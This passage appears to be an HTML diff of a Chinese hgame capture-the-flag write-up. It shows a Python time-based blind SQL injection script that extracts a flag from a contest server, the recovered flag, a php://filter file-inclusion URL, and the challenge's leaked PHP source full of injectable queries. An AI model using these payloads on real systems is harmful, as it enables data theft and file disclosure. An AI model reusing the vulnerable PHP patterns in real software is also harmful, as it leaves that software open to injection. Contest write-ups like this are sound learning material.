class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">cookies = &#123;<span class="string">'PHPSESSID'</span>:<span class="string">'lseqgohjo9eibfivnemk6sa8vd'</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(_in)</span>:</span></span><br><span class="line">    m = hashlib.md5()</span><br><span class="line">    m.update(_in.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_code</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> url</span><br><span class="line">    res = requests.get(url, cookies=cookies).text</span><br><span class="line">    code = re.findall(<span class="string">r'=== (.&#123;4&#125;)&lt;br&gt;'</span>,res)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9999999999999</span>):</span><br><span class="line">        <span class="keyword">if</span> code == md5(str(i)):</span><br><span class="line">            <span class="keyword">return</span> str(i)</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://118.89.111.179:3001/"</span></span><br><span class="line">output = <span class="string">"hgame&#123;sqli_1s_s0_"</span></span><br><span class="line">succ = <span class="string">"sql error"</span></span><br><span class="line">name_dic = string.digits + string.ascii_lowercase + string.ascii_uppercase + <span class="string">'_&#123;&#125;'</span>  + <span class="string">','</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">18</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> name_dic:</span><br><span class="line">        code = get_code()</span><br><span class="line">        <span class="comment"># payload = f'?code=&#123;code&#125;&amp;id=1 and if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;str(i)&#125;,1)="&#123;str(j)&#125;"),0,sleep(5))--+'</span></span><br><span class="line">        <span class="comment"># F11111114G,WORDS</span></span><br><span class="line">        <span class="comment"># payload = f'?code=&#123;code&#125;&amp;id=1 and if((substr((select group_concat(column_name) from information_schema.columns where table_name="F11111114G"),&#123;str(i)&#125;,1)="&#123;str(j)&#125;"),0,sleep(5))--+'</span></span><br><span class="line">        <span class="comment"># FL4444AG</span></span><br><span class="line">        payload = <span class="string">f'?code=<span class="subst">&#123;code&#125;</span>&amp;id=1 and if((substr((select FL4444AG from F11111114G),<span class="subst">&#123;str(i)&#125;</span>,1)=binary "<span class="subst">&#123;str(j)&#125;</span>"),sleep(-5),1)--+'</span></span><br><span class="line">        res = requests.get(url+payload,cookies=cookies).text</span><br><span class="line">        <span class="keyword">if</span> succ <span class="keyword">in</span> res:</span><br><span class="line">            output += j</span><br><span class="line">            print(<span class="string">"output: "</span>,output)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">cookies = &#123;<span class="string">'PHPSESSID'</span>:<span class="string">'lseqgohjo9eibfivnemk6sa8vd'</span>&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(_in)</span>:</span></span><br><span class="line">    m = hashlib.md5()</span><br><span class="line">    m.update(_in.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">    <span class="keyword">return</span> m.hexdigest()[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_code</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> url</span><br><span class="line">    res = requests.get(url, cookies=cookies).text</span><br><span class="line">    code = re.findall(<span class="string">r'=== (.&#123;4&#125;)&lt;br&gt;'</span>,res)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">9999999999999</span>):</span><br><span class="line">        <span class="keyword">if</span> code == md5(str(i)):</span><br><span class="line">            <span class="keyword">return</span> str(i)</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://118.89.111.179:3001/"</span></span><br><span class="line">output = <span class="string">"hgame&#123;sqli_1s_s0_"</span></span><br><span class="line">succ = <span class="string">"sql error"</span></span><br><span class="line">name_dic = string.digits + string.ascii_lowercase + string.ascii_uppercase + <span class="string">'_&#123;&#125;'</span>  + <span class="string">','</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">18</span>,<span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> name_dic:</span><br><span class="line">        code = get_code()</span><br><span class="line">        <span class="comment"># payload = f'?code=&#123;code&#125;&amp;id=1 and if((substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;str(i)&#125;,1)="&#123;str(j)&#125;"),0,sleep(5))--+'</span></span><br><span class="line">        <span class="comment"># F11111114G,WORDS</span></span><br><span class="line">        <span class="comment"># payload = f'?code=&#123;code&#125;&amp;id=1 and if((substr((select group_concat(column_name) from information_schema.columns where table_name="F11111114G"),&#123;str(i)&#125;,1)="&#123;str(j)&#125;"),0,sleep(5))--+'</span></span><br><span class="line">        <span class="comment"># FL4444AG</span></span><br><span class="line">        payload = <span class="string">f'?code=<span class="subst">&#123;code&#125;</span>&amp;id=1 and if((substr((select FL4444AG from F11111114G),<span class="subst">&#123;str(i)&#125;</span>,1)=binary "<span class="subst">&#123;str(j)&#125;</span>"),sleep(-5),1)--+'</span></span><br><span class="line">        res = requests.get(url+payload,cookies=cookies).text</span><br><span class="line">        <span class="keyword">if</span> succ <span class="keyword">in</span> res:</span><br><span class="line">            output += j</span><br><span class="line">            print(<span class="string">"output: "</span>,output)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></div></figure>
 <p>flag如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;sqli_1s_s0_s0_s0_s0_interesting&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="基础渗透"><a href="#基础渗透" class="headerlink" title="基础渗透"></a>基础渗透</h2><p>正常注册登录，发现在点击不同的功能的时候是通过action参数来实现的，比如看到有<code>action=message</code>，猜测是不是存在文件包含，访问message.php页面发现果真存在，尝试文件包含</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://111.231.140.29:10080/index.php?action=php://filter/read=convert.base64-encode/resource=index</span><br></pre></td></tr></table></figure>
-<p>得到源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"template/header.php"</span>);</span><br><span class="line"><span class="keyword">if</span> (is_null($_SESSION[<span class="string">'user_id'</span>])) &#123;</span><br><span class="line">    header(<span class="string">'Location:/login.php'</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">$page = array_key_exists(<span class="string">'action'</span>, $_GET) ? $_GET[<span class="string">'action'</span>] : <span class="string">'message'</span>;</span><br><span class="line"><span class="keyword">require</span> $page .<span class="string">'.php'</span>;</span><br><span class="line"><span class="keyword">include_once</span>(<span class="string">"template/footer.php"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
-<p>functions.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//ini_set("display_errors", "on");</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'config.php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sql_query</span><span class="params">($sql_query)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $mysqli;</span><br><span class="line">    $res = $mysqli-&gt;query($sql_query);</span><br><span class="line">    <span class="keyword">return</span> $res;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">csrf_token</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $token = <span class="string">''</span>;</span><br><span class="line">    $chars = str_split(<span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span>);</span><br><span class="line">    <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; <span class="number">48</span>; $i++) &#123;</span><br><span class="line">        $token = $token . $chars[random_int(<span class="number">0</span>, <span class="number">61</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    $_SESSION[<span class="string">'token'</span>] = $token;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;input type='hidden' value='$token' id='token'&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">res_to_json</span><span class="params">($res, $type)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $json[<span class="string">'type'</span>] = $type;</span><br><span class="line">    $json[<span class="string">'status'</span>] = <span class="string">"true"</span>;</span><br><span class="line">    $json[<span class="string">"content"</span>] = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span> ($res <span class="keyword">as</span> $message) &#123;</span><br><span class="line"></span><br><span class="line">        $array_tmp[<span class="string">'user_id'</span>] = $message[<span class="string">'user_id'</span>];</span><br><span class="line">        $array_tmp[<span class="string">'user'</span>] = $message[<span class="string">'user'</span>];</span><br><span class="line">        $array_tmp[<span class="string">'avatar'</span>] = get_avatar($message[<span class="string">'user_id'</span>]) != <span class="keyword">null</span> ? get_avatar($message[<span class="string">'user_id'</span>])[<span class="string">'content'</span>] : md5($message[<span class="string">'user'</span>]);</span><br><span class="line">        $array_tmp[<span class="string">'message'</span>] = $message[<span class="string">'content'</span>];</span><br><span class="line">        $array_tmp[<span class="string">'message_id'</span>] = $message[<span class="string">'message_id'</span>];</span><br><span class="line">        $array_tmp[<span class="string">'time'</span>] = $message[<span class="string">'date'</span>];</span><br><span class="line">        array_push($json[<span class="string">"content"</span>], $array_tmp);</span><br><span class="line">    &#125;</span><br><span class="line">    $json[<span class="string">"content"</span>] = $json[<span class="string">"content"</span>];</span><br><span class="line">    <span class="keyword">return</span> json_encode($json);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">judge</span><span class="params">($username, $password)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($username == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"username's length error!"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">elseif</span> (strlen($password) &lt; <span class="number">6</span> <span class="keyword">or</span> strlen($password) &gt; <span class="number">16</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"password's length error!"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">($username, $password, $token)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (judge($username, $password) == <span class="number">1</span> <span class="keyword">and</span> $token === $_SESSION[<span class="string">'token'</span>]) &#123;</span><br><span class="line">        $password = md5($password);</span><br><span class="line">        $sql_query = <span class="string">"insert into `users`(`username`,`password`) VALUES ('$username','$password')"</span>;</span><br><span class="line">        $res = sql_query($sql_query);</span><br><span class="line">        <span class="keyword">if</span> ($res) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'register success!'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'error!'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error!"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span><span class="params">($username, $password, $token)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>]) <span class="keyword">and</span> $token === $_SESSION[<span class="string">'token'</span>]) &#123;</span><br><span class="line">        $password = md5($password);</span><br><span class="line">        $sql_query = <span class="string">"select * from `users` where `username`='$username' and `password`='$password'"</span>;</span><br><span class="line">        $res = sql_query($sql_query);</span><br><span class="line">        <span class="keyword">if</span> ($res-&gt;num_rows) &#123;</span><br><span class="line">            $data = $res-&gt;fetch_array();</span><br><span class="line">            $_SESSION[<span class="string">'user_id'</span>] = $data[<span class="string">'user_id'</span>];</span><br><span class="line">            $_SESSION[<span class="string">'user'</span>] = $data[<span class="string">'username'</span>];</span><br><span class="line">            $_SESSION[<span class="string">'groups'</span>] = $data[<span class="string">'groups'</span>];</span><br><span class="line">            $_SESSION[<span class="string">'login'</span>] = <span class="number">1</span>;</span><br><span class="line">            setcookie(<span class="string">'user'</span>, $_SESSION[<span class="string">'user'</span>]);</span><br><span class="line">            setcookie(<span class="string">'groups'</span>, $_SESSION[<span class="string">'groups'</span>]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"error!"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error!"</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">loginout</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_GET[<span class="string">'loginout'</span>] === $_SESSION[<span class="string">'token'</span>]) &#123;</span><br><span class="line">        session_destroy();</span><br><span class="line">        setcookie(<span class="string">'groups'</span>, <span class="keyword">null</span>);</span><br><span class="line">        setcookie(<span class="string">'user'</span>, <span class="keyword">null</span>);</span><br><span class="line">        Header(<span class="string">"Location: index.php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_avatar</span><span class="params">($user_id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $sql_query = <span class="string">"select `avatar` from `users` where `user_id`=$user_id"</span>;</span><br><span class="line">    $res = sql_query($sql_query)-&gt;fetch_row()[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span> ($res) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">array</span>(<span class="string">'name'</span> =&gt; $res, <span class="string">'content'</span> =&gt; base64_encode(file_get_contents(<span class="string">'./img/avatar/'</span> . $res . <span class="string">'.png'</span>)));</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_new_messages</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $start = $_GET[<span class="string">'start'</span>] ?? <span class="number">0</span>;</span><br><span class="line">    $start = addslashes($start);</span><br><span class="line">    $user_id = $_SESSION[<span class="string">'user_id'</span>];</span><br><span class="line">    $sql_query = <span class="string">"select * from `messages` where `user_id`=$user_id LIMIT $start,999999999999"</span>;</span><br><span class="line">    $res = sql_query($sql_query);</span><br><span class="line">    <span class="keyword">if</span> ($res-&gt;num_rows) &#123;</span><br><span class="line">        <span class="keyword">return</span> res_to_json($res, <span class="string">"messages"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_messages</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $start = $_GET[<span class="string">'start'</span>] ?? <span class="number">0</span>;</span><br><span class="line">    $start = addslashes($start);</span><br><span class="line">    $user_id = $_SESSION[<span class="string">'user_id'</span>];</span><br><span class="line">    $sql_query = <span class="string">"select * from `messages` where `user_id`=$user_id ORDER BY `message_id` DESC LIMIT $start,12"</span>;</span><br><span class="line">    $res = sql_query($sql_query);</span><br><span class="line">    <span class="keyword">if</span> ($res-&gt;num_rows) &#123;</span><br><span class="line">        <span class="keyword">return</span> res_to_json($res, <span class="string">"messages"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add_message</span><span class="params">($message)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">'token'</span>] === $_SESSION[<span class="string">'token'</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>]) <span class="keyword">and</span> mb_strlen($message) &gt; <span class="number">6</span>) &#123;</span><br><span class="line">            $user_id = $_SESSION[<span class="string">'user_id'</span>];</span><br><span class="line">            $user = $_SESSION[<span class="string">'user'</span>];</span><br><span class="line">            $sql_query = <span class="string">"insert into `messages`(`user_id`,`user`,`content`) VALUES($user_id,'$user','$message')"</span>;</span><br><span class="line">            sql_query($sql_query);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (!<span class="keyword">isset</span>($_SESSION[<span class="string">'login'</span>])) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"login error"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"length error"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delete_message</span><span class="params">($message_id)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $user_id = $_SESSION[<span class="string">'user_id'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($_POST[<span class="string">'token'</span>] === $_SESSION[<span class="string">'token'</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($_SESSION[<span class="string">'groups'</span>] == <span class="number">0</span>) &#123;</span><br><span class="line">            $sql_query = <span class="string">"delete from `messages` where `message_id`=$message_id and `user_id`=$user_id"</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> ($_SESSION[<span class="string">'groups'</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">            $sql_query = <span class="string">"delete from `messages` where `message_id`=$message_id"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        sql_query($sql_query);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rand_filename</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $tmp = `cat /dev/urandom | head -n <span class="number">10</span> | md5sum | head -c <span class="number">15</span>`;</span><br><span class="line">    $sql_query = <span class="string">"select `avatar` from `users` where `avatar`=$tmp"</span>;</span><br><span class="line">    $res = sql_query($sql_query);</span><br><span class="line">    <span class="keyword">if</span> ($res-&gt;num_rows) &#123;</span><br><span class="line">        <span class="keyword">return</span> rand_filename();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> $tmp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_avatar</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $type = $_FILES[<span class="string">'file'</span>][<span class="string">'type'</span>];</span><br><span class="line">    $user_id = $_SESSION[<span class="string">'user_id'</span>];</span><br><span class="line">    <span class="keyword">if</span> ($type == <span class="string">'image/gif'</span> || $type == <span class="string">'image/jpeg'</span> || $type == <span class="string">'image/png'</span>) &#123;</span><br><span class="line">        $avatar = get_avatar($user_id);</span><br><span class="line">        <span class="keyword">if</span> ($avatar == <span class="keyword">null</span>) &#123;</span><br><span class="line">            $name = rand_filename();</span><br><span class="line">            move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], <span class="string">"./img/avatar/"</span> . $name . <span class="string">".png"</span>);</span><br><span class="line">            $sql_query = <span class="string">"update `users` set `avatar`='$name' WHERE `user_id`=$user_id"</span>;</span><br><span class="line">            sql_query($sql_query);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], <span class="string">"./img/avatar/"</span> . $avatar[<span class="string">'name'</span>] . <span class="string">".png"</span>);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change_password</span><span class="params">($opassword, $npassword, $npasswod_again)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (judge($_SESSION[<span class="string">'user'</span>], $npassword)) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($npasswod_again !== $npassword) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"difference error"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $user_id = $_SESSION[<span class="string">'user_id'</span>];</span><br><span class="line">            $sql_query = <span class="string">"select `password` from `users` where `user_id`=$user_id"</span>;</span><br><span class="line">            $res = sql_query($sql_query);</span><br><span class="line">            <span class="keyword">if</span> ($res-&gt;num_rows) &#123;</span><br><span class="line">                <span class="keyword">if</span> ($res-&gt;fetch_row()[<span class="number">0</span>] === md5($opassword)) &#123;</span><br><span class="line">                    $sql_query = <span class="string">"update `users` set `password`=md5($npassword) WHERE `user_id`=$user_id"</span>;</span><br><span class="line">                    $res = sql_query($sql_query);</span><br><span class="line">                    <span class="keyword">echo</span> $res;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"successful"</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">"oldpassword error"</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
